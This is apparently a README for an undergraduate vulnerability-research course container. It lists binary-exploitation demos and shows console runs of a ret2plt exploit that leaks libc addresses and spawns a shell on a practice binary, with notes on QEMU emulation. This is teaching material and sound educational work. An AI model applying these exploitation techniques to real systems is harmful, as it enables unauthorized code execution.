## Undergrad VR Docker Container

Building the course as a docker instance allows us to distribute course demonstrations verified to work. You can launch the container with ``docker run -ti tjoconnor/vr-course``, which will drop you into a ``tmux`` session with a ``zsh`` in the ``demos`` directory.

```
# docker run -ti tjoconnor/vr-course

{8:53}/demos ➭ ls
aarch64-demo  fastbins-demo  hof-demo  oob-demo      ret2dlresolve-demo  seccomp-demo    srop-demo    type-confusion-demo
brop-demo     heap-demo      jop-demo  ret2csu-demo  ret2plt-demo        shellcode-demo  tcache-demo  unsafe-unlink-demo

```
Each of the course demonstrations has a binary and a script that can be used to demonstrate the exploit technique by launching ``python3 pwn-ret2plt.py BIN=./chal.bin ``.  Adding ``GDB`` to the script opens a debugger next to the run program.  

```
# docker run -ti tjoconnor/vr-course

{8:50}/demos ➭ cd ret2plt-demo

{8:50}/demos/ret2plt-demo ➭ ls
chal.bin  check-elf-rop-primitives.py  check-libc-rop-primitives.py  flag.txt  pwn-ret2plt.py  README.md  solarpanther.py  src

{8:50}/demos/ret2plt-demo ➭ python3 pwn-ret2plt.py BIN=./chal.bin 
 
[*] Loading gadgets for '/demos/ret2plt-demo/chal.bin'
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/demos/ret2plt-demo/chal.bin': pid 83
[*] POP RDI is at 0x400723
[*] GOT[gets] is at 0x601028
[*] PLT[puts] is at 0x400520
[*] main is at 0x4196006
[*] Sending Ret2PLT Chain and Waiting for GOT[gets] Leak
[*] Paused (press any to continue)
[*] GOT[Gets] is at 0x7f61abae3050
[*] Calculating Libc Base: GOT[gets](0x7f61abae3050) - Libc.sym[Gets] (0x75050) = Libc Base (0x7f61aba6e000)
[*] Libc base is at 0x7f61aba6e000
[*] System is at 0x7f61ababa920
[*] /bin/sh is at 0x7f61abc0404f
[*] Paused (press any to continue)
[*] Sending Chain Borrowing /bin/sh (0x7f61abc0404f) and system (0x7f61ababa920) from Libc
[*] Switching to interactive mode
$ cat flag.txt
flag{i_sure_wished_this_worked_remotely_too}
```

Adding ``QEMU`` emulates the execution using ``qemu-amd64``, which is useful for environments like Macbook Arm-Based machines that cannot properly call ``ptrace()`` inside amd64-based containers. Launching the same script on a M2 Macbook looks like the following. Notice that libc address space is now controlled by QEMU and lacks the normal tell-tale ``0x7f`` initial byte. 

```
# docker run -ti tjoconnor/vr-course QEMU

# python3 pwn-ret2plt.py BIN=./chal.bin QEMU

[*] Loading gadgets for '/demos/ret2plt-demo/chal.bin'
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/usr/bin/qemu-amd64': pid 83
[*] POP RDI is at 0x400723
[*] GOT[gets] is at 0x601028
[*] PLT[puts] is at 0x400520
[*] main is at 0x4196006
[*] Sending Ret2PLT Chain and Waiting for GOT[gets] Leak
[*] Paused (press any to continue)
[*] GOT[Gets] is at 0x2aaaab363050
[*] Calculating Libc Base: GOT[gets](0x2aaaab363050) - Libc.sym[Gets] (0x75050) = Libc Base (0x2aaaab2ee000)
[*] Libc base is at 0x2aaaab2ee000
[*] System is at 0x2aaaab33a920
[*] /bin/sh is at 0x2aaaab48404f
[*] Paused (press any to continue)
[*] Sending Chain Borrowing /bin/sh (0x2aaaab48404f) and system (0x2aaaab33a920) from Libc
[*] Switching to interactive mode

$ cat flag.txt
flag{i_sure_wished_this_worked_remotely_too}
```

## QEMU Emualtion Issues

Unfortunately, not all of the emulated binaries work correctly at this time. 

The following demonstrations do not work under QEMU emulation
- seccomp-demo
- srop-demo
- type-confusion-demo
- brop-demo

The following demonstrations do not work under QEMU but work fine if ROSETTA is the Docker Emulation engine
- fastbins
- unsafe unlink
- ret2csu
